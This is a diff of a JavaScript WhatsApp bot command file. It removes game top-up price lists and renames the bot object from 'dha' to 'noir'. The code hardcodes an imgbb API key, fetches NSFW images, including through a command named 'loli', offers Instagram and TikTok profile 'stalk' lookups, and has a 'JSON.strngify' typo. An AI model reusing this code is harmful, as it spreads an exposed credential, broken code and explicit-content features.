-_SEWAKTU WAKTU_
-_BUDAYAKAN BERTANYA_
-_SEBELUM PEMBELIAN_
-JIKA BERMINAT 
-#order
-ATAU HUBUNGIN HUB :
-   *©hzkyx*
-wa.me/6281220670449`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
-                                   quoted: ftoko,
-                                   caption: teksnya
-                            })
-                            break
-                     case 'cpcod':
-                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            teksnya = `*「CP CALL OF DUTTY」*
-━━━━━━━━━━━━━━━━━━━━
-• *26 + 5 CP = Rp 7.000*
-• *53 + 9 CP = Rp 12.000*
-• *106 + 21 CP = Rp 22.000*
-• *264 + 53 CP = Rp 53.000*
-• *528 + 106 CP = Rp 102.000*
-• *1056 + 317 CP = Rp 202.000*
-━━━━━━━━━━━━━━━━━━━━
-*NOTE :*
-_HARGA BISA BERUBAH_
-_SEWAKTU WAKTU_
-_BUDAYAKAN BERTANYA_
-_SEBELUM PEMBELIAN_
-JIKA BERMINAT 
-#order
-ATAU HUBUNGIN HUB :
-   *©hzkyx*
-wa.me/6281220670449`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
-                                   quoted: ftoko,
-                                   caption: teksnya
-                            })
-                            break
-                     case 'cashpb':
-                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            teksnya = `*「CASH POIN BLANK」*
-━━━━━━━━━━━━━━━━━━━━
-• *1200 PB CASH = Rp 11.000*
-• *2400 PB CASH = Rp 21.000*
-• *6000 PB CASH = Rp 52.000*
-• *12000 PB CASH = Rp 100.000*
-━━━━━━━━━━━━━━━━━━━━
-*NOTE :*
-_HARGA BISA BERUBAH_
-_SEWAKTU WAKTU_
-_BUDAYAKAN BERTANYA_
-_SEBELUM PEMBELIAN_
-JIKA BERMINAT 
-#order
-ATAU HUBUNGIN HUB :
-   *©hzkyx*
-wa.me/6281220670449`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
-                                   quoted: toko,
-                                   caption: teksnya
-                            })
-                            break
-                     case 'catcoin':
-                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            teksnya = `*「CAT COIN RAGNAROK」*
-━━━━━━━━━━━━━━━━━━━━
-• *1 BIG CAT COIN = Rp 6.000*
-• *3 BIG CAT COIN = Rp 10.000*
-• *4 BIG CAT COIN = Rp 13.000*
-• *8 BIG CAT COIN = Rp 23.000*
-• *20 BIG CAT COIN = Rp 62.000*
-• *40 BIG CAT COIN = Rp 102.000*
-━━━━━━━━━━━━━━━━━━━━
-*NOTE :*
-_HARGA BISA BERUBAH_
-_SEWAKTU WAKTU_
-_BUDAYAKAN BERTANYA_
-_SEBELUM PEMBELIAN_
-JIKA BERMINAT 
-#order
-ATAU HUBUNGIN HUB :
-   *©hzkyx*
-wa.me/6282287486762`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
-                                   quoted: ftoko,
-                                   caption: teksnya
-                            })
-                            break
-                     case 'candysausage':
-                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            teksnya = `*「CANDY SAUSAGE」*
-━━━━━━━━━━━━━━━━━━━━
-• *60 CANDY SAUSAGE = Rp 16.000*
-• *180 CANDY SAUSAGE = Rp 10.000*
-• *316 CANDY SAUSAGE = Rp 50.000*
-• *718 CANDY SAUSAGE = Rp 80.000*
-• *1368 CANDY SAUSAGE = Rp 150.000*
-• *2118 CANDY SAUSAGE = Rp 455.000*
-━━━━━━━━━━━━━━━━━━━━
-*NOTE :*
-_HARGA BISA BERUBAH_
-_SEWAKTU WAKTU_
-_BUDAYAKAN BERTANYA_
-_SEBELUM PEMBELIAN_
-JIKA BERMINAT 
-#order
-ATAU HUBUNGIN HUB :
-   *©hzkyx*
-wa.me/6282287486762`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
-                                   quoted: ftoko,
-                                   caption: teksnya
-                            })
-                            break
-                     case 'ucpubg':
-                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
-                            teksnya = `*「UC PUBG」*
-━━━━━━━━━━━━━━━━━━━━
-• *25 UC = Rp 8.000*
-• *35 UC = Rp 10.000*
-• *50 UC = Rp 12.000*
-• *70 UC = Rp 17.000*
-• *125 UC = Rp 28.000*
-• *120 UC = Rp 18.000*
-• *150 UC = Rp 35.000*
-• *210 UC = Rp 45.000*
-• *250 UC = Rp 53.000*
-• *355 UC = Rp 50.000*
-• *500 UC = Rp 100.000*
-• *700 UC = Rp 139.000*
-• *825 UC = Rp 160.000*
-• *910 UC = Rp 179.000*
-• *1120 UC = Rp 219.000*
-• *1400 UC = Rp 273.000*
-• *1750 UC = Rp 340.000*
-━━━━━━━━━━━━━━━━━━━━
-*NOTE :*
-_HARGA BISA BERUBAH_
-_SEWAKTU WAKTU_
-_BUDAYAKAN BERTANYA_
-_SEBELUM PEMBELIAN_
-JIKA BERMINAT 
-#order
-ATAU HUBUNGIN HUB :
-   *©hzkyx*
-wa.me/6281220670449`
-                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
-                                   quoted: ftext,
-                                   caption: teksnya
-                            })
-                            break
                      case 'order':
                             buttons = [{
                                    buttonId: `${prefix}masukandata`,
@@ -2268,7 +2023,7 @@ wa.me/6281220670449`
                                    },
                                    type: 1
                             }]
-                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
+                            imageMsg = (await noir.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                    thumbnail: fs.readFileSync(`./media/diablo.png`)
                             })).imageMessage
                             buttonsMessage = {
@@ -2278,12 +2033,12 @@ wa.me/6281220670449`
                                    buttons,
                                    headerType: 4
                             }
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {
                                    quoted: ftoko
                             })
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             break
 
                             //------------------< Sticker Cmd >-------------------
@@ -2530,7 +2285,7 @@ _Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                                    for (let i = 0; i < results.length; i++) {
                                           vars += `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
                                    }
-                                   dha.sendMessage(from, ss, image, {
+                                   noir.sendMessage(from, ss, image, {
                                           caption: vars,
                                           quoted: mek
                                    })
@@ -2590,7 +2345,7 @@ _*Tunggu Proses Upload Media......*_`
                                    })
                             break
                      case 'tiktok':
-                            if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dha-chan02.github.io`)
+                            if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://noir-chan02.github.io`)
                             if (!q) return reply('Linknya?')
                             if (!q.includes('tiktok')) return reply(mess.error.Iv)
                             buttons = [{
@@ -2606,7 +2361,7 @@ _*Tunggu Proses Upload Media......*_`
                                    },
                                    type: 1
                             }]
-                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
+                            imageMsg = (await noir.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                    thumbnail: fs.readFileSync(`./media/diablo.png`)
                             })).imageMessage
                             buttonsMessage = {
@@ -2616,12 +2371,12 @@ _*Tunggu Proses Upload Media......*_`
                                    buttons,
                                    headerType: 4
                             }
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {
                                    quoted: mek
                             })
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             break
                      case 'ttaudio':
                      case 'tiktokmusic':
@@ -2629,7 +2384,7 @@ _*Tunggu Proses Upload Media......*_`
                             if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                             ini_link = args[0]
                             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${setting.lolkey}&url=${ini_link}`)
-                            dha.sendMessage(from, get_audio, audio, {
+                            noir.sendMessage(from, get_audio, audio, {
                                    mimetype: Mimetype.mp4Audio,
                                    quoted: mek
                             })
@@ -2670,7 +2425,7 @@ _*Tunggu Proses Upload Media......*_`
                             if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
                             ini_link = args[0]
                             ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${setting.lolkey}&url=${ini_link}`)
-                            await dha.sendMessage(from, ini_buffer, image, {
+                            await noir.sendMessage(from, ini_buffer, image, {
                                    quoted: mek
                             })
                             break
@@ -2685,13 +2440,13 @@ _*Tunggu Proses Upload Media......*_`
                                    get_info = get_result.info
                                    teks = `\n${get_result.title_romaji}\n\n${get_result.title_native}\n\nCharacter : ${get_info.characters.join(", ")}\n`
                                    ini_image = await getBuffer(get_result.image[0])
-                                   dha.sendMessage(from, ini_image, image, {
+                                   noir.sendMessage(from, ini_image, image, {
                                           caption: teks,
                                           quoted: mek
                                    })
                                    anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${setting.lolkey}`)
                                    pdf = await getBuffer(anu.result)
-                                   dha.sendMessage(from, pdf, document, {
+                                   noir.sendMessage(from, pdf, document, {
                                           quoted: mek,
                                           mimetype: Mimetype.pdf,
                                           filename: `${get_result.title_romaji}.pdf`,
@@ -2752,7 +2507,7 @@ _*Tunggu Proses Upload Media......*_`
                             }
                             ini_txt += `\nDescription : ${get_result.description}`
                             thumbnail = await getBuffer(get_result.coverImage.large)
-                            await dha.sendMessage(from, thumbnail, image, {
+                            await noir.sendMessage(from, thumbnail, image, {
                                    quoted: mek,
                                    caption: ini_txt
                             })
@@ -2770,7 +2525,7 @@ _*Tunggu Proses Upload Media......*_`
                                           xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
                                    }
                                    buffer = await getBuffer(data[0].thumb)
-                                   dha.sendMessage(from, buffer, image, {
+                                   noir.sendMessage(from, buffer, image, {
                                           caption: xixixai,
                                           quoted: mek
                                    })
@@ -2809,7 +2564,7 @@ _*Tunggu Proses Upload Media......*_`
                             }
                             ini_txt += `\nDescription : ${get_result.description}`
                             thumbnail = await getBuffer(get_result.coverImage.large)
-                            await dha.sendMessage(from, thumbnail, image, {
+                            await noir.sendMessage(from, thumbnail, image, {
                                    quoted: mek,
                                    caption: ini_txt
                             })
@@ -2840,7 +2595,7 @@ _*Tunggu Proses Upload Media......*_`
                                    }
                             }
                             ini_buffer = await getBuffer(get_result.thumbnail)
-                            await dha.sendMessage(from, ini_buffer, image, {
+                            await noir.sendMessage(from, ini_buffer, image, {
                                    quoted: mek,
                                    caption: ini_txt
                             })
@@ -2898,7 +2653,7 @@ _*Tunggu Proses Upload Media......*_`
                                    }
                             }
                             ini_buffer = await getBuffer(get_result.thumb)
-                            await dha.sendMessage(from, ini_buffer, image, {
+                            await noir.sendMessage(from, ini_buffer, image, {
                                    quoted: mek,
                                    caption: ini_txt
                             })
@@ -2923,7 +2678,7 @@ _*Tunggu Proses Upload Media......*_`
                      case 'wallnime':
                             reply(mess.wait)
                             getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`).then((gambar) => {
-                                   dha.sendMessage(from, gambar, image, {
+                                   noir.sendMessage(from, gambar, image, {
                                           quoted: mek,
                                           thumbnail: Buffer.alloc(0)
                                    })
@@ -2932,7 +2687,7 @@ _*Tunggu Proses Upload Media......*_`
 
                      case 'hentai':
                             getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${setting.lolkey}`).then((gambar) => {
-                                   dha.sendMessage(from, gambar, image, {
+                                   noir.sendMessage(from, gambar, image, {
                                           quoted: mek
                                    })
                             })
@@ -2941,7 +2696,7 @@ _*Tunggu Proses Upload Media......*_`
                             reply(mess.wait)
                             anu = await fetchJson(`https://lolhuman.herokuapp.com/api/storynime?apikey=${setting.lolkey}`)
                             buffer = await getBuffer(anu.result)
-                            dha.sendMessage(from, buffer, video, {
+                            noir.sendMessage(from, buffer, video, {
                                    quoted: mek
                             })
                             break
@@ -3000,7 +2755,7 @@ _*Tunggu Proses Upload Media......*_`
                                    ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
                             }
                             buff = await getBuffer(o[0].thumb)
-                            dha.sendMessage(from, buff, image, {
+                            noir.sendMessage(from, buff, image, {
                                    quoted: mek,
                                    caption: ot
                             })
@@ -3022,7 +2777,7 @@ _*Tunggu Proses Upload Media......*_`
                                    },
                                    type: 1
                             }]
-                            imageMsg = (await dha.prepareMessage(from, inifile, 'imageMessage', {
+                            imageMsg = (await noir.prepareMessage(from, inifile, 'imageMessage', {
                                    thumbnail: Buffer.alloc(0)
                             })).message.imageMessage
                             buttonsMessage = {
@@ -3032,12 +2787,12 @@ _*Tunggu Proses Upload Media......*_`
                                    buttons,
                                    headerType: 4
                             }
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {
                                    quoted: mek
                             })
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             fs.unlinkSync(`./${sender}.jpeg`)
                             break
                      case 'loli':
@@ -3045,7 +2800,7 @@ _*Tunggu Proses Upload Media......*_`
                      case 'milf':
                      case 'cosplay':
                      case 'wallml':
-                            if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dha-chan02.github.io`)
+                            if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://noir-chan02.github.io`)
                             let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
                             let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
                             fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
@@ -3062,7 +2817,7 @@ _*Tunggu Proses Upload Media......*_`
                                    },
                                    type: 1
                             }]
-                            imageMsg = (await dha.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {
+                            imageMsg = (await noir.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {
                                    thumbnail: Buffer.alloc(0)
                             })).message.imageMessage
                             buttonsMessage = {
@@ -3072,12 +2827,12 @@ _*Tunggu Proses Upload Media......*_`
                                    buttons,
                                    headerType: 4
                             }
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {
                                    quoted: mek
                             })
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             fs.unlinkSync(`./${sender}.jpeg`)
                             break
                      case 'playy':
@@ -3156,7 +2911,7 @@ Source : ${anu.result.source}
 *[Wait] Tunggu Sebentar..*`
                             ///////buffer = await getBuffer(anu.result.thumbnail)
                             buffer1 = await getBuffer(anu.result.url_video)
-                            dha.sendMessage(from, buffer1, video, {
+                            noir.sendMessage(from, buffer1, video, {
                                    mimetype: 'video/mp4',
                                    filename: `${anu.result.video}.mp4`,
                                    quoted: freply,
@@ -3178,7 +2933,7 @@ Source : ${anu.result.source}
                                    },
                                    type: 1
                             }]
-                            imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
+                            imageMsg = (await noir.prepareMessageMedia(fs.readFileSync(`./media/diablo.png`), 'imageMessage', {
                                    thumbnail: fs.readFileSync(`./media/diablo.png`)
                             })).imageMessage
                             buttonsMessage = {
@@ -3188,12 +2943,12 @@ Source : ${anu.result.source}
                                    buttons,
                                    headerType: 4
                             }
-                            prep = await dha.prepareMessageFromContent(from, {
+                            prep = await noir.prepareMessageFromContent(from, {
                                    buttonsMessage
                             }, {
                                    quoted: mek
                             })
-                            dha.relayWAMessage(prep)
+                            noir.relayWAMessage(prep)
                             break
                      case 'lirik':
                             if (!q) return reply(mess.wrongFormat)
@@ -3212,7 +2967,7 @@ Source : ${anu.result.source}
                             ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${setting.lolkey}&query=${query}`)
                             ini_url = ini_url.result
                             ini_buffer = await getBuffer(ini_url)
-                            await dha.sendMessage(from, ini_buffer, image, {
+                            await noir.sendMessage(from, ini_buffer, image, {
                                    quoted: mek
                             })
                             break
@@ -3239,7 +2994,7 @@ Source : ${anu.result.source}
 \`\`\`▢ Link : ${get_data[i].url}\`\`\``
                                    }
                                    ini_buffer = await getBuffer(get_data[0].img_detail[0])
-                                   dha.sendMessage(from, ini_buffer, image, {
+                                   noir.sendMessage(from, ini_buffer, image, {
                                           quoted: mek,
                                           caption: teks
                                    })
@@ -3268,7 +3023,7 @@ Source : ${anu.result.source}
 `
                                    }
                                    ini_buffer = await getBuffer(get_result[0].thumb)
-                                   dha.sendMessage(from, ini_buffer, image, {
+                                   noir.sendMessage(from, ini_buffer, image, {
                                           quoted: mek,
                                           caption: teks
                                    })
@@ -3309,7 +3064,7 @@ Source : ${anu.result.source}
                             if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo) && args.length == 0) {
                                    reply(mess.wait)
                                    boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   owgi = await dha.downloadMediaMessage(boij)
+                                   owgi = await noir.downloadMediaMessage(boij)
                                    res = await uploadImages(owgi)
                                    reply(res)
                             } else {
@@ -3321,12 +3076,12 @@ Source : ${anu.result.source}
                             reply(mess.wait)
                             var imgbb = require('imgbb-uploader')
                             var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                            var media = await dha.downloadAndSaveMediaMessage(encmedia)
+                            var media = await noir.downloadAndSaveMediaMessage(encmedia)
                             imgbb('39d895963468b814fad0514bd28787e2', media)
                                    .then(data => {
                                           var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
                                           ibb = fs.readFileSync(media)
-                                          dha.sendMessage(from, ibb, image, {
+                                          noir.sendMessage(from, ibb, image, {
                                                  quoted: mek,
                                                  caption: caps
                                           })
@@ -3342,7 +3097,7 @@ Source : ${anu.result.source}
                                    .then(async (body) => {
                                           asupann = body.split('\n')
                                           asupanx = asupann[Math.floor(Math.random() * asupann.length)]
-                                          sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, '\`\`\`ASUPAN BRO GUA DAPAT DARI LORD ©hzkyx\`\`\`')
+                                          sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, '\`\`\`ASUPAN BRO GUA DAPAT DARI LORD ©noir\`\`\`')
                                           console.log('Success sending video!')
                                    })
                                    .catch(async (err) => {
@@ -3359,7 +3114,7 @@ Source : ${anu.result.source}
                             res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
                             if (res.data.error) return reply(res.data.error)
                             buff = Buffer.from(res.data.result.split(',')[1], 'base64')
-                            dha.sendMessage(from, buff, image, {
+                            noir.sendMessage(from, buff, image, {
                                    quoted: mek,
                                    caption: mess.success
                             }).catch(e => {
@@ -3375,13 +3130,13 @@ Source : ${anu.result.source}
                             let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
                             let userRank = level.getUserRank(sender, _level)
                             try {
-                                   profilePic = await dha.getProfilePicture(sender)
+                                   profilePic = await noir.getProfilePicture(sender)
                             } catch {
                                    profilePic = errorImg
                             }
                             buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/rank?apikey=${setting.lolkey}&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
                             teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
-                            dha.sendMessage(from, buffer, image, {
+                            noir.sendMessage(from, buffer, image, {
                                    caption: teks,
                                    quoted: mek
                             })
@@ -3449,7 +3204,7 @@ Source : ${anu.result.source}
                             //------------------< Stalk >-------------------
                      case 'stalkgithub':
                      case 'githubstalk':
-                            if (args.length == 0) return reply(`Example: ${prefix + command} dha-chan02`)
+                            if (args.length == 0) return reply(`Example: ${prefix + command} noir-chan02`)
                             reply(mess.wait)
                             username = args[0]
                             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${setting.lolkey}`)
@@ -3468,14 +3223,14 @@ Source : ${anu.result.source}
 \`\`\`▢ Mengikuti : ${ini_result.bio}\`\`\`
 \`\`\`▢ Link : ${ini_result.url}\`\`\`
 `
-                            dha.sendMessage(from, ini_buffer, image, {
+                            noir.sendMessage(from, ini_buffer, image, {
                                    caption: ini_txt,
                                    thumbnail: Buffer.alloc(0)
                             })
                             break
                      case 'stalkig':
                      case 'igstalk':
-                            if (args.length == 0) return reply(`Example: ${prefix + command} dha.chan26`)
+                            if (args.length == 0) return reply(`Example: ${prefix + command} noir.chan26`)
                             reply(mess.wait)
                             username = args[0]
                             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${setting.lolkey}`)
@@ -3493,7 +3248,7 @@ Source : ${anu.result.source}
 \`\`\`▢ Deskripsi : ${ini_result.bio}\`\`\`
 \`\`\`▢ Link : https://instagram.com/${ini_result.username}\`\`\`
 `
-                            dha.sendMessage(from, ini_buffer, image, {
+                            noir.sendMessage(from, ini_buffer, image, {
                                    caption: ini_txt,
                                    thumbnail: Buffer.alloc(0)
                             })
@@ -3519,7 +3274,7 @@ Source : ${anu.result.source}
 \`\`\`▢ Video : ${get_result.video}\`\`\`
 \`\`\`▢ Deskripsi : ${get_result.bio}\`\`\`
 `
-                            dha.sendMessage(from, pp_tt, image, {
+                            noir.sendMessage(from, pp_tt, image, {
                                    quoted: mek,
                                    caption: ini_txt,
                                    thumbnail: Buffer.alloc(0)
@@ -3537,7 +3292,7 @@ Source : ${anu.result.source}
                                           teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
                                    }
                                    ini_buffer = await getBuffer(get_result[0].profile_pic)
-                                   dha.sendMessage(from, ini_buffer, image, {
+                                   noir.sendMessage(from, ini_buffer, image, {
                                           quoted: mek,
                                           caption: teks
                                    })
@@ -3618,7 +3373,7 @@ Source : ${anu.result.source}
                             reply('Sending ' + ini_sticker.length + ' stickers...')
                             for (sticker_ in ini_sticker) {
                                    ini_buffer = await getBuffer(ini_sticker[sticker_])
-                                   dha.sendMessage(from, ini_buffer, sticker, {})
+                                   noir.sendMessage(from, ini_buffer, sticker, {})
                             }
                             break
                      case 'semoji':
@@ -3631,7 +3386,7 @@ Source : ${anu.result.source}
                                    emoji = encodeURI(emoji)
                             }
                             ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${setting.lolkey}`)
-                            await dha.sendMessage(from, ini_buffer, sticker, {
+                            await noir.sendMessage(from, ini_buffer, sticker, {
                                    quoted: mek
                             })
                             break
@@ -3643,9 +3398,9 @@ Source : ${anu.result.source}
                             sendStickerUrl(from, anjay)
                             break
                      case 'attp':
-                            if (args.length == 0) return reply(`Example: ${prefix + command} yudha`)
+                            if (args.length == 0) return reply(`Example: ${prefix + command} yunoir`)
                             buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
-                            dha.sendMessage(from, buffer, sticker, {
+                            noir.sendMessage(from, buffer, sticker, {
                                    quoted: mek
                             })
                             break
@@ -3681,7 +3436,7 @@ Source : ${anu.result.source}
                      case 'stiker':
                             if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   const media = await dha.downloadAndSaveMediaMessage(encmedia)
+                                   const media = await noir.downloadAndSaveMediaMessage(encmedia)
                                    ran = '666.webp'
                                    await ffmpeg(`./${media}`)
                                           .input(media)
@@ -3695,7 +3450,7 @@ Source : ${anu.result.source}
                                           })
                                           .on('end', function () {
                                                  console.log('Finish')
-                                                 dha.sendMessage(from, fs.readFileSync(ran), sticker, {
+                                                 noir.sendMessage(from, fs.readFileSync(ran), sticker, {
                                                         quoted: mek
                                                  })
                                                  fs.unlinkSync(media)
@@ -3706,7 +3461,7 @@ Source : ${anu.result.source}
                                           .save(ran)
                             } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   const media = await dha.downloadAndSaveMediaMessage(encmedia)
+                                   const media = await noir.downloadAndSaveMediaMessage(encmedia)
                                    ran = '999.webp'
                                    reply(mess.wait)
                                    await ffmpeg(`./${media}`)
@@ -3722,7 +3477,7 @@ Source : ${anu.result.source}
                                           })
                                           .on('end', function () {
                                                  console.log('Finish')
-                                                 dha.sendMessage(from, fs.readFileSync(ran), sticker, {
+                                                 noir.sendMessage(from, fs.readFileSync(ran), sticker, {
                                                         quoted: mek
                                                  })
                                                  fs.unlinkSync(media)
@@ -3739,22 +3494,22 @@ Source : ${anu.result.source}
                      case 'colong':
                             if (!isQuotedSticker) return reply('Stiker aja om')
                             encmedia = JSON.parse(JSON.strngify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            media = await dha.downloadAndSaveMediaMessage(encmedia)
+                            media = await noir.downloadAndSaveMediaMessage(encmedia)
                             anu = args.join(' ').split('|')
                             satu = anu[0] !== '' ? anu[0] : `${pushname}`
                             dua = typeof anu[1] !== 'undefined' ? anu[1] : `UwU`
                             require('./lib/fetch.js').createExif(satu, dua)
-                            require('./lib/fetch.js').modStick(media, dha, mek, from)
+                            require('./lib/fetch.js').modStick(media, noir, mek, from)
                             break
                      case 'delwm':
                             if (!isQuotedSticker) return reply('Stiker aja om')
                             encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            media = await dha.downloadAndSaveMediaMessage(encmedia)
+                            media = await noir.downloadAndSaveMediaMessage(encmedia)
                             anu = args.join(' ').split('|')
                             satu = anu[0] !== '' ? anu[0] : ``
                             dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
                             require('./lib/fetch.js').createExif(satu, dua)
-                            require('./lib/fetch.js').modStick(media, dha, mek, from)
+                            require('./lib/fetch.js').modStick(media, noir, mek, from)
                             break
                      case 'stikerwm':
                      case 'stickerwm':
@@ -3763,13 +3518,13 @@ Source : ${anu.result.source}
                             var b = arg.split("|")[1];
                             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   media = await dha.downloadAndSaveMediaMessage(encmedia)
+                                   media = await noir.downloadAndSaveMediaMessage(encmedia)
                                    await createExif(a, b)
                                    out = getRandom('.webp')
                                    ffmpeg(media)
                                           .on('error', (e) => {
                                                  console.log(e)
-                                                 dha.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
+                                                 noir.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
                                                         quoted: mek
                                                  })
                                                  fs.unlinkSync(media)
@@ -3778,7 +3533,7 @@ Source : ${anu.result.source}
                                                  _out = getRandom('.webp')
                                                  spawn('webpmux', ['-set', 'exif', './sticker/data.exif', out, '-o', _out])
                                                         .on('exit', () => {
-                                                               dha.sendMessage(from, fs.readFileSync(_out), 'stickerMessage', {
+                                                               noir.sendMessage(from, fs.readFileSync(_out), 'stickerMessage', {
                                                                       quoted: mek
                                                                })
                                                                fs.unlinkSync(out)
@@ -3791,7 +3546,7 @@ Source : ${anu.result.source}
                                           .save(out)
                             } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   const media = await dha.downloadAndSaveMediaMessage(encmedia)
+                                   const media = await noir.downloadAndSaveMediaMessage(encmedia)
                                    pe = args.join('')
                                    var a = pe.split("|")[0];
                                    var b = pe.split("|")[1];
@@ -3800,7 +3555,7 @@ Source : ${anu.result.source}
                                    ffmpeg(media)
                                           .on('error', (e) => {
                                                  console.log(e)
-                                                 dha.sendMessage(from, 'Terjadi kesalahan', 'conversation', {
